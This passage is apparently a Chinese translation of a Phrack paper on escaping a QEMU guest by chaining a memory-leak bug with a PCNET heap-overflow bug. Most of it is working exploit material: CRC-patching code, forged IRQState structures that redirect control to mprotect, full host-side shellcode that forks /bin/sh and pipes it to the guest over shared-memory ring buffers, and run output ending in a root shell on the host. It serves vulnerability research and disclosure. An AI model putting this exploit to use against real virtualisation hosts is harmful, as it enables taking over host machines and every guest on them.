	uint32_t buffer[2] = { 0xcafecafe };
	uint8_t *ptr = (uint8_t *)buffer;

	fcs = crc_compute(ptr, 4);
	printf("[+] current crc = %010p, required crc = \n", fcs);

	fcs = crc_reverse(fcs, 0xdeadbeef);
	printf("[+] applying patch = %010p\n", fcs);
	buffer[1] = fcs;

	fcs = crc_compute(ptr, 8);
	if (fcs == 0xdeadbeef)
		printf("[+] crc patched successfully\n");
}
```



## 4.4 - Exploit

exp（附件源码 tarball 的 cve-2015-7504.c 文件）将网卡重置为默认设置，然后配置 Tx 和 Rx 描述符并设置所需的标志，最后初始化并重启网卡使配置生效。

exp 剩下的部分只是用一个数据包触发了漏洞，造成 QEMU 崩溃。如下所示，带有指向 0x7f66deadbeef 的已损坏 irq 变量的`qemu_set_irq` 被调用。因为这个地址没有可执行的 handler，QEMU 崩溃。

```
(gdb) shell ps -e | grep qemu
 8335 pts/4    00:00:03 qemu-system-x86
(gdb) attach 8335
...
(gdb) c
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x00007f669ce6c363 in qemu_set_irq (irq=0x7f66deadbeef, level=0)
43	    irq->handler(irq->opaque, irq->n, level);

```



## 5 - Putting all Together

在本节中，我们合并了前两个 exp 以便从虚拟机中逃逸并以 QEMU 的权限在主机执行代码。首先，我们利用 CVE-2015-5165 重现 QEMU 内存布局。准确的说，这个 exp 尝试获得下面的地址来绕过 ASLR：

* 客户机物理内存基地址。在我们的 exp 中，我们需要在客户机中做一些内存分配并获得他们在 QEMU 虚拟地址空间中的精确地址。
* `.text` 节的基地址。这用来获得 `qemu_set_irq()` 函数的地址。
* `.plt` 节的基地址。这用来确定一些例如 `fork()` 和 `execv()`的函数地址来构造我们的 shellcode。`mprotect()` 的地址也是必须的，用于改变客户机物理地址的权限。记住分配给客户机的物理地址是不可执行的。

### 5.1 - RIP Control

在第四节中我们已经控制了 %rip 寄存器。我们不让 QEMU 随便在一个地址崩溃，而是用一个伪造的 IRQState 结构体的地址来覆盖 PCNET 缓冲区，这样可以执行我们选择的函数。

初 见 时，我们可能尝试构造一个 IRQState 调用 `system()`。然而，这个调用将会失败，因为一些 QEMU 内存映射没有被 `fork()` 继承，准确的说，maap 的物理内存有 MADV_DONTFORK 标志：

```c
qemu_madvise(new_block->host, new_block->max_length, QEMU_MADV_DONTFORK);
```

调用 execv() 也是没用的，因为我们失去了客户机的控制权。

还要注意，可以通过连接几个 IRQState 构造 shellcode，以便调用多个函数，因为 `qemu_set_irq()` 被 PCNET 设备仿真器调用多次。然而，我们发现在启用 shellcode 所处的页内存的 PROT_EXEC 标志后，执行 shellcode 更加方便可靠。

我们的想法是构造两个 IRQState 结构体。第一个用于调用 `mprotect()`，第二个用于调用 shellcode，shellcode 首先取消第一个的 MADV_DONTFORK 标志，然后在客户机和主机之间运行一个交互式的 shell。

如前所述，当 `qemu_set_irq()` 被调用，它使用两个参数作为输入：`irq`（指向 IRQstate 结构体的指针）和 `level`（IRQ level），然后像下面这样调用 handler：

```c
void qemu_set_irq(qemu_irq irq, int level)
{
    if (!irq)
        return;

    irq->handler(irq->opaque, irq->n, level);
}
```

如上所属，我们只控制了前两个参数。那么如何调用有三个参数的 `mprotect()`？

为了解决这个问题，我们将使 `qemu_set_irq()` 先用以下参数调用自身：

* `irq` ：指向伪造的 IRQState 的指针，设置 handler 指针为 `mprotect()` 函数。
* `level`：mprotect 标志设置为：PROT_READ | PROT_WRITE | PROT_EXEC

这是通过设置两个伪造的 IRQState 结构体实现的，代码片段如下：

```c
struct IRQState {
    uint8_t  _nothing[44];
    uint64_t  handler;
    uint64_t  arg_1;
    int32_t   arg_2;
};

struct IRQState  fake_irq[2];
hptr_t fake_irq_mem = gva_to_hva(fake_irq);

/* do qemu_set_irq */
fake_irq[0].handler = qemu_set_irq_addr;
fake_irq[0].arg_1 = fake_irq_mem + sizeof(struct IRQState);
fake_irq[0].arg_2 = PROT_READ | PROT_WRITE | PROT_EXEC;

/* do mprotect */
fake_irq[1].handler = mprotec_addrt;
fake_irq[1].arg_1 = (fake_irq_mem >> PAGE_SHIFT) << PAGE_SHIFT;
fake_irq[1].arg_2 = PAGE_SIZE;
```

溢出发生后，调用 `qemu_set_irq()` 时有一个伪造的 handler 指针，只是再次调用 `qemu_set_irq()`，在循环调用中将 `level` 参数调整为 7（mprotect 需要的）时调用 mprotect。

现在内存是可执行的，我们可以通过重写第一个 IRQState 的handler 为 shellcode 的地址把控制权交给我们的交互式 shell。

```c
payload.fake_irq[0].handler = shellcode_addr;
payload.fake_irq[0].arg_1 = shellcode_data;
```



### 5.2 - Interactive Shell

👴（Well），我们可以简单的写一个基础的 shellcode，绑定在 netcat 的某个端口上，然后通过其他机器连接这个 shell。这是一个令人满意的解决方案，但我们如果可以避免防火墙限制会更好。我们可以利用客户机和主机之间的共享内存来构造一个 bindshell。

利用 QEMU 漏洞有一些巧妙，我们在客户机编写的代码在 QEMU 进程内存中已经是可用的。所以不必再注入 shellcode。更好的是，我们可以共享代码，使他在客户机上运行并攻击主机。

下图总结了共享内存和主机、客户机上的进程/线程。

我们创建两个共享的环形缓冲区（in 和 out）并提供通过自旋锁访问这些共享内存区域的读/写原语。在主机上，我们运行一个 shellcode 复制一个单独进程的 stdin 和 stdout 文件描述符，然后在它上面开启一个 `/bin/sh` shell。我们还创建了两个线程。第一个从共享内存中读取命令然后通过一个管道传给 shell，第二个读取 shell 的输出（通过第二个管道）然后把它们写入共享内存。

这两个线程也在客户机中实现，分别用于在专用的共享内存中写用户输入的命令，输出从第二个环形缓冲区读取的结果到 stdout。

注意在我们的 exp中有第三个线程（和一个专用的共享区域）处理 stderr 输出。

```
     GUEST                   SHARED MEMORY                  HOST
     -----                   -------------                  ----
 +------------+                                         +------------+
 |  exploit   |                                         |    QEMU    |
 |  (thread)  |                                         |   (main)   |
 +------------+                                         +------------+

 +------------+                                         +------------+
 |  exploit   | sm_write()             head   sm_read() |    QEMU    |
 |  (thread)  |----------+               |--------------|  (thread)  |
 +------------+          |               V              +---------++-+
                         |  xxxxxxxxxxxxxx----+          pipe IN  ||
                         |  x                 |         +---------++-+
                         |  x   ring buffer   |         |    shell   |
                tail ------>x (filled with x) ^         | fork proc. |
                            |                 |         +---------++-+
                            +-------->--------+          pipe OUT ||
 +------------+                                         +---------++-+
 |  exploit   | sm_read()              tail  sm_write() |    QEMU    |
 |  (thread)  |----------+               |--------------|  (thread)  |
 +------------+          |               V              +------------+
                         |  xxxxxxxxxxxxxx----+
                         |  x                 |
                         |  x   ring buffer   |
                head ------>x (filled with x) ^
                            |                 |
                            +-------->--------+
```



### 5.3 - VM-Escape Exploit

在本节中，我们概述了完整 exp（vm-escape.c）中用到的主要结构体和函数。

注入的 payload 由下面的结构体定义：

```c
struct payload {
	struct IRQState    fake_irq[2];
	struct shared_data shared_data;
	uint8_t            shellcode[1024];
	uint8_t            pipe_fd2r[1024];
	uint8_t            pipe_r2fd[1024];
};
```

其中 `fake_irq` 是一对负责调用 `mprotect()` 并更改 payload 所在页面权限的 IRQState 结构体。

结构体 `shared_data` 用于传递参数给主要的 shellcode：

```c
struct shared_data {
	struct GOT       got;
	uint8_t          shell[64];
	hptr_t           addr;
	struct shared_io shared_io;
	volatile int     done;
};
```

其中 got 结构体充当全局偏移表，它包含 shellcode 运行的主要函数地址。这些函数地址可以通过内存泄露得到。

```c
struct GOT {
	typeof(open)           *open;
	typeof(close)          *close;
	typeof(read)           *read;
	typeof(write)          *write;
	typeof(dup2)           *dup2;
	typeof(pipe)           *pipe;
	typeof(fork)           *fork;
	typeof(execv)          *execv;
	typeof(malloc)         *malloc;
	typeof(madvise)        *madvise;
	typeof(pthread_create) *pthread_create;
	typeof(pipe_r2fd)      *pipe_r2fd;
	typeof(pipe_fd2r)      *pipe_fd2r;
};
```

主要的 shellcode 由下面的函数定义：

```c
* main code to run after %rip control */
void shellcode(struct shared_data *shared_data)
{
	pthread_t t_in, t_out, t_err;
	int in_fds[2], out_fds[2], err_fds[2];
	struct brwpipe *in, *out, *err;
	char *args[2] = { shared_data->shell, NULL };

	if (shared_data->done) {
		return;
	}

	shared_data->got.madvise((uint64_t *)shared_data->addr,
	                         PHY_RAM, MADV_DOFORK);

	shared_data->got.pipe(in_fds);
	shared_data->got.pipe(out_fds);
	shared_data->got.pipe(err_fds);

	in = shared_data->got.malloc(sizeof(struct brwpipe));
	out = shared_data->got.malloc(sizeof(struct brwpipe));
	err = shared_data->got.malloc(sizeof(struct brwpipe));

	in->got = &shared_data->got;
	out->got = &shared_data->got;
	err->got = &shared_data->got;

	in->fd = in_fds[1];
	out->fd = out_fds[0];
	err->fd = err_fds[0];

	in->ring = &shared_data->shared_io.in;
	out->ring = &shared_data->shared_io.out;
	err->ring = &shared_data->shared_io.err;

	if (shared_data->got.fork() == 0) {
		shared_data->got.close(in_fds[1]);
		shared_data->got.close(out_fds[0]);
		shared_data->got.close(err_fds[0]);
		shared_data->got.dup2(in_fds[0], 0);
		shared_data->got.dup2(out_fds[1], 1);
		shared_data->got.dup2(err_fds[1], 2);
		shared_data->got.execv(shared_data->shell, args);
	}
	else {
		shared_data->got.close(in_fds[0]);
		shared_data->got.close(out_fds[1]);
		shared_data->got.close(err_fds[1]);

		shared_data->got.pthread_create(&t_in, NULL,
		                                shared_data->got.pipe_r2fd, in);
		shared_data->got.pthread_create(&t_out, NULL,
		                                shared_data->got.pipe_fd2r, out);
		shared_data->got.pthread_create(&t_err, NULL,
		                                shared_data->got.pipe_fd2r, err);

		shared_data->done = 1;
	}
}
```

shellcode 首先检查 `shared_data->done` 标志避免多次运行 shellcode（记住把控制权交给 shellcode 的 `qemu_set_irq used` 被 QEMU 代码调用多次）。

shellcode 调用 `madvise()`，`shared_data->addr` 指向物理内存。取消 MADV_DONTFORK 标志是必要的，可以在 `fork()`调用之间保留内存映射。

shellcode 创建一个子进程，用于启动一个 shell（`/bin/sh`）。母进程（parent process）启动多个线程去使用共享内存区域，从客户机传递 shell 到被攻击的主机，并把命令的结果写会客户机上。母进程和子进程的通信由管道实现。

如下所示，共享内存区域由一个可被 `sm_read()` 和 `sm_write()` 原语访问的环形缓冲区构成：

```c
struct shared_ring_buf {
	volatile bool lock;
	bool          empty;
	uint8_t       head;
	uint8_t       tail;
	uint8_t       buf[SHARED_BUFFER_SIZE];
};

static inline
__attribute__((always_inline))
ssize_t sm_read(struct GOT *got, struct shared_ring_buf *ring,
                char *out, ssize_t len)
{
	ssize_t read = 0, available = 0;

	do {
		/* spin lock */
		while (__atomic_test_and_set(&ring->lock, __ATOMIC_RELAXED));

		if (ring->head > ring->tail) { // loop on ring
			available = SHARED_BUFFER_SIZE - ring->head;
		} else {
			available = ring->tail - ring->head;
			if (available == 0 && !ring->empty) {
				available = SHARED_BUFFER_SIZE - ring->head;
			}
		}
		available = MIN(len - read, available);

		imemcpy(out, ring->buf + ring->head, available);
		read += available;
		out += available;
		ring->head += available;

		if (ring->head == SHARED_BUFFER_SIZE)
			ring->head = 0;

		if (available != 0 && ring->head == ring->tail)
			ring->empty = true;

		__atomic_clear(&ring->lock, __ATOMIC_RELAXED);
	} while (available != 0 || read == 0);

	return read;
}

static inline
__attribute__((always_inline))
ssize_t sm_write(struct GOT *got, struct shared_ring_buf *ring,
                 char *in, ssize_t len)
{
	ssize_t written = 0, available = 0;

	do {
		/* spin lock */
		while (__atomic_test_and_set(&ring->lock, __ATOMIC_RELAXED));

		if (ring->tail > ring->head) { // loop on ring
			available = SHARED_BUFFER_SIZE - ring->tail;
		} else {
			available = ring->head - ring->tail;
			if (available == 0 && ring->empty) {
				available = SHARED_BUFFER_SIZE - ring->tail;
			}
		}
		available = MIN(len - written, available);

		imemcpy(ring->buf + ring->tail, in, available);
		written += available;
		in += available;
		ring->tail += available;

		if (ring->tail == SHARED_BUFFER_SIZE)
			ring->tail = 0;

		if (available != 0)
			ring->empty = false;

		__atomic_clear(&ring->lock, __ATOMIC_RELAXED);
	} while (written != len);

	return written;
}

```

以下线程函数使用这些原语。第一个从共享内存区域读取数据并写到一个文件描述符中。第二个从一个文件描述符中读取数据并写到共享内存区域中。

```c
void *pipe_r2fd(void *_brwpipe)
{
	struct brwpipe *brwpipe = (struct brwpipe *)_brwpipe;
	char buf[SHARED_BUFFER_SIZE];
	ssize_t len;

	while (true) {
		len = sm_read(brwpipe->got, brwpipe->ring, buf, sizeof(buf));
		if (len > 0)
			brwpipe->got->write(brwpipe->fd, buf, len);
	}

	return NULL;
} SHELLCODE(pipe_r2fd)

void *pipe_fd2r(void *_brwpipe)
{
	struct brwpipe *brwpipe = (struct brwpipe *)_brwpipe;
	char buf[SHARED_BUFFER_SIZE];
	ssize_t len;

	while (true) {
		len = brwpipe->got->read(brwpipe->fd, buf, sizeof(buf));
		if (len < 0) {
			return NULL;
		} else if (len > 0) {
			len = sm_write(brwpipe->got, brwpipe->ring, buf, len);
		}
	}

	return NULL;
}
```

注意这些函数的代码在主机和客户机之间是共享的。这些线程也在客户机中实现，用于读取用户输入的命令并把它们拷贝到专用的共享内存区域（在内存中），并写回这些命令在相应共享内存区域中可获得的输出（out 和 err 共享内存）：

```c
void session(struct shared_io *shared_io)
{
	size_t len;
	pthread_t t_in, t_out, t_err;
	struct GOT got;
	struct brwpipe *in, *out, *err;

	got.read = &read;
	got.write = &write;

	warnx("[!] enjoy your shell");
	fputs(COLOR_SHELL, stderr);

	in = malloc(sizeof(struct brwpipe));
	out = malloc(sizeof(struct brwpipe));
	err = malloc(sizeof(struct brwpipe));

	in->got = &got;
	out->got = &got;
	err->got = &got;

	in->fd = STDIN_FILENO;
	out->fd = STDOUT_FILENO;
	err->fd = STDERR_FILENO;

	in->ring = &shared_io->in;
	out->ring = &shared_io->out;
	err->ring = &shared_io->err;

	pthread_create(&t_in, NULL, pipe_fd2r, in);
	pthread_create(&t_out, NULL, pipe_r2fd, out);
	pthread_create(&t_err, NULL, pipe_r2fd, err);

	pthread_join(t_in, NULL);
	pthread_join(t_out, NULL);
	pthread_join(t_err, NULL);
}
```

上一节给出的图说明了共享内存和客户机、主机中运行的进程/线程。

exp 的目标是有漏洞版本的 QEMU，使用 4.9.2 版本的 gcc 编译。为了使 exp 适应特定的 QEMU，我们提供一个 shell 脚本（build-exploit.sh），它将输出一个带有所需偏移的 C 头文件：

```
$ ./build-exploit <path-to-qemu-binary> > qemu.h
```

运行完整的 exp（vm-escape.c）将会有下面的输出：

```
$ ./vm-escape
$ exploit: [+] found 190 potential ObjectProperty structs in memory 
$ exploit: [+] .text mapped at 0x7fb6c55c3620
$ exploit: [+] mprotect mapped at 0x7fb6c55c0f10
$ exploit: [+] qemu_set_irq mapped at 0x7fb6c5795347
$ exploit: [+] VM physical memory mapped at 0x7fb630000000
$ exploit: [+] payload at 0x7fb6a8913000
$ exploit: [+] patching packet ...
$ exploit: [+] running first attack stage
$ exploit: [+] running shellcode at 0x7fb6a89132d0
$ exploit: [!] enjoy your shell
$ shell > id
$ uid=0(root) gid=0(root) ...
```



### 5.4 - Limitations

请注意，当前的利用由于某种原因仍然不可靠。在我们的测试环境中（Debian 7 running a 3.16 kernel on x_86_64 arch），我们已经观察到失败概率大约是每 10 次运行失败一次。在大多数失败尝试中，exp 因为不能使用的泄露数据而不能重现 QEMU 内存布局。

这个 exp 在不带 CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE 标志编译的 linux kernel 中不能使用。这种情况下 QEMU 二进制文件（默认选项 -fPIE 编译）映射到一个单独的地址空间，如下所示：

```

55e5e3fdd000-55e5e4594000 r-xp 00000000 fe:01 6940407   [qemu-system-x86_64]
55e5e4794000-55e5e4862000 r--p 005b7000 fe:01 6940407           ...
55e5e4862000-55e5e48e3000 rw-p 00685000 fe:01 6940407           ...
55e5e48e3000-55e5e4d71000 rw-p 00000000 00:00 0 
55e5e6156000-55e5e7931000 rw-p 00000000 00:00 0         [heap]

7fb80b4f5000-7fb80c000000 rw-p 00000000 00:00 0 
7fb80c000000-7fb88c000000 rw-p 00000000 00:00 0         [2 GB of RAM] 
7fb88c000000-7fb88c915000 rw-p 00000000 00:00 0 
                     ...
7fb89b6a0000-7fb89b6cb000 r-xp 00000000 fe:01 794385    [first shared lib]
7fb89b6cb000-7fb89b8cb000 ---p 0002b000 fe:01 794385            ...
7fb89b8cb000-7fb89b8cc000 r--p 0002b000 fe:01 794385            ...
7fb89b8cc000-7fb89b8cd000 rw-p 0002c000 fe:01 794385            ...
                     ...
7ffd8f8f8000-7ffd8f91a000 rw-p 00000000 00:00 0         [stack]
7ffd8f970000-7ffd8f972000 r--p 00000000 00:00 0         [vvar]
7ffd8f972000-7ffd8f974000 r-xp 00000000 00:00 0         [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]

```

结果是我们的 4 字节溢出不足以覆盖 `irq` 指针（初始位于堆上的某个 0x55xxxxxxxxxx）指向我们伪造的 IRQState 结构体（注入到某个 0x7fxxxxxxxxxx）

## 6 - Conclusions

在本文中，我们提出了两种在 QEMU 网络设备仿真器上的漏洞利用方法。这些利用方法结合起来将日穿虚拟机（break out from a VM）并在主机上执行代码。

在这项工作中，我们可能不止一千次搞炸了（crashed）我们的测试虚拟机。调试失败的利用尝试是枯燥的，尤其是复杂的 shellcode 导致多进程、多线程（with a complex shellcode that spawns several threads an processes）。因此，我们希望我们已经提供了足够的技术细节和通用技术，可以在 QEMU 的进一步利用中重用。

## 7 - Greets

We would like to thank Pierre-Sylvain Desse for his insightful comments. Greets to coldshell, and Kevin Schouteeten for helping us to test on various environments. Thanks also to Nelson Elhage for his seminal work on VM-escape. And a big thank to the reviewers of the Phrack Staff for challenging us to improve the paper and the code.



## 8 - References

[1] http://venom.crowdstrike.com
[2] media.blackhat.com/bh-us-11/Elhage/BH_US_11_Elhage_Virtunoid_WP.pdf
[3] https://github.com/nelhage/virtunoid/blob/master/virtunoid.c
[4] http://lettieri.iet.unipi.it/virtualization/2014/Vtx.pdf
[5] https://www.kernel.org/doc/Documentation/vm/pagemap.txt
[6] https://blog.affien.com/archives/2005/07/15/reversing-crc/

## 9 - Source Code

略

